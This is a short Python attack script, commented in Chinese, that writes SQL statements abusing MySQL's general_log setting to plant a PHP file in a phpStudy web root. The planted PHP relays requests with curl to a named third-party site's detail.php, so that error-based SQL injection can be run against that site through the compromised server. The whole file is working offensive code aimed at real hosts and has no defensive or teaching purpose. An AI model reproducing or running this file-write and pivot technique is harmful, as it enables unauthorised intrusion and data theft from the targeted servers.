#!/usr/bin/env python3
"""gen_sqli_probe.py - 生成sqli_probe.php(81.70测yijingweb SQLi详情)
?id=687' 报错注入提取信息
"""
body = '<?php $id=$_GET["id"];$ch=curl_init("http://yijingweb.com/webmall/detail.php?id=".$id);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);echo $r;?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/yj_probe.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/yj_probe.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
